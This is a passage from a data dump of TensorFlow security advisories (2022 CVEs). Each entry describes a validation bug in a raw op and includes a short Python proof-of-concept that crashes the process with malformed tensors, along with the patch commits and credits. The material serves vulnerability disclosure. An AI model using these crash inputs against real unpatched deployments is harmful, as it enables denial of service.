tf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3074,20741,tensorflow,GHSA-9fpg-838v-wpv7,CVE-2022-35971,https://github.com/advisories/GHSA-9fpg-838v-wpv7,moderate,2022-09-16 22:20:09 UTC,TensorFlow vulnerable to `CHECK` fail in `FakeQuantWithMinMaxVars`,"### Impact
If `FakeQuantWithMinMaxVars` is given `min` or `max` tensors of a nonzero rank, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

num_bits = 8
narrow_range = False
inputs = tf.constant(0, shape=[2,3], dtype=tf.float32)
min = tf.constant(0, shape=[2,3], dtype=tf.float32)
max = tf.constant(0, shape=[2,3], dtype=tf.float32)
tf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
 - Neophytos Christou, Secure Systems Labs, Brown University.
 - 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
",pip
3075,20741,tensorflow,GHSA-g35r-369w-3fqp,CVE-2022-35970,https://github.com/advisories/GHSA-g35r-369w-3fqp,moderate,2022-09-16 22:17:57 UTC,TensorFlow vulnerable to segfault in `QuantizedInstanceNorm`,"### Impact
If `QuantizedInstanceNorm` is given `x_min` or `x_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

output_range_given = False
given_y_min = 0
given_y_max = 0
variance_epsilon = 1e-05
min_separation = 0.001
x = tf.constant(88, shape=[1,4,4,32], dtype=tf.quint8)
x_min = tf.constant([], shape=[0], dtype=tf.float32)
x_max = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.QuantizedInstanceNorm(x=x, x_min=x_min, x_max=x_max, output_range_given=output_range_given, given_y_min=given_y_min, given_y_max=given_y_max, variance_epsilon=variance_epsilon, min_separation=min_separation)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3076,20741,tensorflow,GHSA-q2c3-jpmc-gfjx,CVE-2022-35969,https://github.com/advisories/GHSA-q2c3-jpmc-gfjx,moderate,2022-09-16 22:17:17 UTC,TensorFlow vulnerable to `CHECK` fail in `Conv2DBackpropInput`,"### Impact
The implementation of `Conv2DBackpropInput` requires `input_sizes` to be 4-dimensional. Otherwise, it gives a `CHECK` failure which can be used to trigger a denial of service attack:
```python
import tensorflow as tf

strides = [1, 1, 1, 1]
padding = ""SAME""
use_cudnn_on_gpu = True
explicit_paddings = []
data_format = ""NHWC""
dilations = [1, 1, 1, 1]
input_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)
filter = tf.constant(0.159749106, shape=[3,3,2,2], dtype=tf.float32)
out_backprop = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.Conv2DBackpropInput(input_sizes=input_sizes, filter=filter, out_backprop=out_backprop, strides=strides, padding=padding, use_cudnn_on_gpu=use_cudnn_on_gpu, explicit_paddings=explicit_paddings, data_format=data_format, dilations=dilations)
```

### Patches
We have patched the issue in GitHub commit [50156d547b9a1da0144d7babe665cf690305b33c](https://github.com/tensorflow/tensorflow/commit/50156d547b9a1da0144d7babe665cf690305b33c).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3077,20741,tensorflow,GHSA-2475-53vw-vp25,CVE-2022-35968,https://github.com/advisories/GHSA-2475-53vw-vp25,moderate,2022-09-16 22:16:52 UTC,TensorFlow vulnerable to `CHECK` fail in `AvgPoolGrad`,"### Impact
The implementation of `AvgPoolGrad` does not fully validate the input `orig_input_shape`. This results in a `CHECK` failure which can be used to trigger a denial of service attack:
```python
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = ""VALID""
data_format = ""NHWC""
orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)
grad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)
tf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3078,20741,tensorflow,GHSA-v6h3-348g-6h5x,CVE-2022-35967,https://github.com/advisories/GHSA-v6h3-348g-6h5x,moderate,2022-09-16 22:16:30 UTC,TensorFlow vulnerable to segfault in `QuantizedAdd`,"### Impact
If `QuantizedAdd` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

Toutput = tf.qint32
x = tf.constant(140, shape=[1], dtype=tf.quint8)
y = tf.constant(26, shape=[10], dtype=tf.quint8)
min_x = tf.constant([], shape=[0], dtype=tf.float32)
max_x = tf.constant(0, shape=[], dtype=tf.float32)
min_y = tf.constant(0, shape=[], dtype=tf.float32)
max_y = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y, Toutput=Toutput)
```

### Patches
We have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3079,20741,tensorflow,GHSA-4w68-4x85-mjj9,CVE-2022-35966,https://github.com/advisories/GHSA-4w68-4x85-mjj9,moderate,2022-09-16 22:15:49 UTC,TensorFlow vulnerable to segfault in `QuantizedAvgPool`,"### Impact
If `QuantizedAvgPool` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = ""SAME""
input = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)
```

### Patches
We have patched the issue in GitHub commit [7cdf9d4d2083b739ec81cfdace546b0c99f50622](https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3080,20741,tensorflow,GHSA-h7ff-cfc9-wmmh,CVE-2022-35990,https://github.com/advisories/GHSA-h7ff-cfc9-wmmh,moderate,2022-09-16 22:15:21 UTC,TensorFlow vulnerable to `CHECK` fail in `FakeQuantWithMinMaxVarsPerChannelGradient`,"### Impact
When `tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient` receives input `min` or `max` of rank other than 1, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_2=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_3=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_4=8
arg_5=False
arg_6=None
tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(gradients=arg_0, 
            inputs=arg_1, min=arg_2,  max=arg_3, num_bits=arg_4, 
            narrow_range=arg_5, name=arg_6)
```

### Patches
We have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 
 - 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
 - Neophytos Christou, Secure Systems Labs, Brown University
",pip
3081,20741,tensorflow,GHSA-vm7x-4qhj-rrcq,CVE-2022-35991,https://github.com/advisories/GHSA-vm7x-4qhj-rrcq,moderate,2022-09-16 22:15:05 UTC,TensorFlow vulnerable to `CHECK` fail in `TensorListScatter` and `TensorListScatterV2`,"### Impact
When `TensorListScatter` and `TensorListScatterV2` receive an `element_shape` of a rank greater than one, they give a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bb03fdf4aae944ab2e4b35c7daa051068a8b7f61](https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3082,20741,tensorflow,GHSA-qxpx-j395-pw36,CVE-2022-35965,https://github.com/advisories/GHSA-qxpx-j395-pw36,moderate,2022-09-16 22:14:39 UTC,TensorFlow vulnerable to segfault in `LowerBound` and `UpperBound`,"### Impact
If `LowerBound` or `UpperBound` is given an empty`sorted_inputs` input, it results in a `nullptr` dereference, leading to a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.int32
sorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)
values = tf.constant([], shape=[10,10,0,10,0], dtype=tf.float32)
tf.raw_ops.LowerBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
```
```python
import tensorflow as tf

out_type = tf.int64
sorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)
values = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)
tf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [bce3717eaef4f769019fd18e990464ca4a2efeea](https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3083,20741,tensorflow,GHSA-9v8w-xmr4-wgxp,CVE-2022-35992,https://github.com/advisories/GHSA-9v8w-xmr4-wgxp,moderate,2022-09-16 22:14:20 UTC,TensorFlow vulnerable to `CHECK` fail in `TensorListFromTensor`,"### Impact
When `TensorListFromTensor` receives an `element_shape` of a rank greater than one, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(6, 6, 2), dtype=tf.bfloat16, maxval=None)
arg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)
arg_2=''
tf.raw_ops.TensorListFromTensor(tensor=arg_0, element_shape=arg_1, name=arg_2)
```

### Patches
We have patched the issue in GitHub commit [3db59a042a38f4338aa207922fa2f476e000a6ee](https://github.com/tensorflow/tensorflow/commit/3db59a042a38f4338aa207922fa2f476e000a6ee).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3084,20741,tensorflow,GHSA-wq6q-6m32-9rv9,CVE-2022-35993,https://github.com/advisories/GHSA-wq6q-6m32-9rv9,moderate,2022-09-16 22:14:09 UTC,TensorFlow vulnerable to `CHECK` fail in `SetSize`,"### Impact
When `SetSize` receives an input `set_shape` that is not a 1D tensor, it gives a `CHECK` fails that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=1
arg_1=[1,1]
arg_2=1
arg_3=True
arg_4=''
tf.raw_ops.SetSize(set_indices=arg_0, set_values=arg_1, set_shape=arg_2,
                   validate_indices=arg_3, name=arg_4)
```

### Patches
We have patched the issue in GitHub commit [cf70b79d2662c0d3c6af74583641e345fc939467](https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3085,20741,tensorflow,GHSA-f7r5-q7cx-h668,CVE-2022-35964,https://github.com/advisories/GHSA-f7r5-q7cx-h668,moderate,2022-09-16 22:14:00 UTC,TensorFlow vulnerable to segfault in `BlockLSTMGradV2`,"### Impact
The implementation of `BlockLSTMGradV2` does not fully validate its inputs.
 - `wci`, `wcf`, `wco`, `b` must be rank 1
 - `w`, cs_prev`, `h_prev` must be rank 2
 - `x` must be rank 3
This results in a a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

use_peephole = False
seq_len_max = tf.constant(1, shape=[], dtype=tf.int64)
x = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
w = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
b = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
i = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
f = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
o = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
ci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
co = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
tf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)
```

### Patches
We have patched the issue in GitHub commit [2a458fc4866505be27c62f81474ecb2b870498fa](https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3086,20741,tensorflow,GHSA-84jm-4cf3-9jfm,CVE-2022-35963,https://github.com/advisories/GHSA-84jm-4cf3-9jfm,moderate,2022-09-16 22:13:23 UTC,TensorFlow vulnerable to `CHECK` failures in `FractionalAvgPoolGrad`,"### Impact
The implementation of `FractionalAvgPoolGrad` does not fully validate the input `orig_input_tensor_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack.
```python
import tensorflow as tf

overlapping = True
orig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)
out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)
row_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
col_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
tf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
```

### Patches
We have patched the issue in GitHub commit [03a659d7be9a1154fdf5eeac221e5950fec07dad](https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3087,20741,tensorflow,GHSA-h5vq-gw2c-pq47,CVE-2022-35952,https://github.com/advisories/GHSA-h5vq-gw2c-pq47,moderate,2022-09-16 22:12:59 UTC,TensorFlow vulnerable to `CHECK` failures in `UnbatchGradOp`,"### Impact
The [`UnbatchGradOp`](https://github.com/tensorflow/tensorflow/blob/769eddaf479c8debead9a59a72617d6ed6f0fe10/tensorflow/core/kernels/batch_kernels.cc#L891) function takes an argument `id` that is assumed to be a scalar. A nonscalar `id` can trigger a `CHECK` failure and crash the program.
```python
import numpy as np
import tensorflow as tf

# `id` is not scalar
tf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,1,], dtype=tf.int64))
```
It also requires its argument `batch_index` to contain three times the number of elements as indicated in its `batch_index.dim_size(0)`. An incorrect `batch_index` can trigger a `CHECK` failure and crash the program.
```python
import numpy as np
import tensorflow as tf

# batch_index's size is not 3
tf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))
```

### Patches
We have patched the issue in GitHub commit [5f945fc6409a3c1e90d6970c9292f805f6e6ddf2](https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Kang Hong Jin from Singapore Management University and 刘力源 from the Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
",pip
3088,20741,tensorflow,GHSA-x989-q2pq-4q5x,CVE-2022-35940,https://github.com/advisories/GHSA-x989-q2pq-4q5x,moderate,2022-09-16 22:12:41 UTC,TensorFlow vulnerable to Int overflow in `RaggedRangeOp`,"### Impact
The [`RaggedRangOp`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/kernels/ragged_range_op.cc#L74-L88) function takes an argument `limits` that is eventually used to construct a `TensorShape` as an `int64`. If `limits` is a very large float, it can overflow when converted to an `int64`. This triggers an `InvalidArgument` but also throws an abort signal that crashes the program.
```python
import tensorflow as tf
tf.raw_ops.RaggedRange(starts=[1.1,0.1],limits=[10.0,1e20],deltas=[1,1])
```

### Patches
We have patched the issue in GitHub commit [37cefa91bee4eace55715eeef43720b958a01192](https://github.com/tensorflow/tensorflow/commit/37cefa91bee4eace55715eeef43720b958a01192).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.",pip
3089,20741,tensorflow,GHSA-fhfc-2q7x-929f,CVE-2022-35994,https://github.com/advisories/GHSA-fhfc-2q7x-929f,moderate,2022-09-16 22:11:58 UTC,TensorFlow vulnerable to `CHECK` fail in `CollectiveGather`,"### Impact
When `CollectiveGather` receives an scalar input `input`, it gives a `CHECK` fails that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=1
arg_1=1
arg_2=1
arg_3=1
arg_4=(3, 3,3)
arg_5='auto'
arg_6=0
arg_7=''
tf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,
                            instance_key=arg_3, shape=arg_4,
                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)
```

### Patches
We have patched the issue in GitHub commit [c1f491817dec39a26be3c574e86a88c30f3c4770](https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3090,20741,tensorflow,GHSA-v5xg-3q2c-c2r4,CVE-2022-35960,https://github.com/advisories/GHSA-v5xg-3q2c-c2r4,moderate,2022-09-16 22:11:18 UTC,TensorFlow vulnerable to `CHECK` failure in `TensorListReserve` via missing validation,"### Impact
In [`core/kernels/list_kernels.cc's TensorListReserve`](https://github.com/tensorflow/tensorflow/blob/c8ba76d48567aed347508e0552a257641931024d/tensorflow/core/kernels/list_kernels.cc#L322-L325), `num_elements` is assumed to be a tensor of size 1. When a `num_elements` of more than 1 element is provided, then `tf.raw_ops.TensorListReserve` fails the `CHECK_EQ` in `CheckIsAlignedAndSingleElement`.
```python
import tensorflow as tf

tf.raw_ops.TensorListReserve(element_shape=(1,1), num_elements=tf.constant([1,1], dtype=tf.int32), element_dtype=tf.int8)
```

### Patches
We have patched the issue in GitHub commit [b5f6fbfba76576202b72119897561e3bd4f179c7](https://github.com/tensorflow/tensorflow/commit/b5f6fbfba76576202b72119897561e3bd4f179c7).


The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Kang Hong Jin from Singapore Management University.
",pip
3091,20741,tensorflow,GHSA-q5jv-m6qw-5g37,CVE-2022-35996,https://github.com/advisories/GHSA-q5jv-m6qw-5g37,moderate,2022-09-16 22:11:10 UTC,TensorFlow vulnerable to floating point exception in `Conv2D`,"### Impact
If `Conv2D` is given empty `input` and the `filter` and `padding` sizes are valid, the output is all-zeros. This causes division-by-zero floating point exceptions that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
with tf.device(""CPU""): # also can be triggerred on GPU
   input = np.ones([1, 0, 2, 1])
   filter = np.ones([1, 1, 1, 1])
   strides = ([1, 1, 1, 1])
   padding = ""EXPLICIT""
   explicit_paddings = [0 , 0, 1, 1, 1, 1, 0, 0]
   data_format = ""NHWC""
   res = tf.raw_ops.Conv2D(
       input=input,
       filter=filter,
       strides=strides,
       padding=padding,
        explicit_paddings=explicit_paddings,
       data_format=data_format,
  )
```

### Patches
We have patched the issue in GitHub commit [611d80db29dd7b0cfb755772c69d60ae5bca05f9](https://github.com/tensorflow/tensorflow/commit/611d80db29dd7b0cfb755772c69d60ae5bca05f9).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.
",pip
3092,20741,tensorflow,GHSA-wxjj-cgcx-r3vq,CVE-2022-35959,https://github.com/advisories/GHSA-wxjj-cgcx-r3vq,moderate,2022-09-16 22:11:00 UTC,TensorFlow vulnerable to `CHECK` failures in `AvgPool3DGrad`,"### Impact
The implementation of `AvgPool3DGradOp` does not fully validate the input `orig_input_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack:
```python
import tensorflow as tf

ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = ""SAME""
data_format = ""NDHWC""
orig_input_shape = tf.constant(1879048192, shape=[5], dtype=tf.int32)
grad = tf.constant(1, shape=[1,3,2,4,2], dtype=tf.float32)
tf.raw_ops.AvgPool3DGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [9178ac9d6389bdc54638ab913ea0e419234d14eb](https://github.com/tensorflow/tensorflow/commit/9178ac9d6389bdc54638ab913ea0e419234d14eb).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
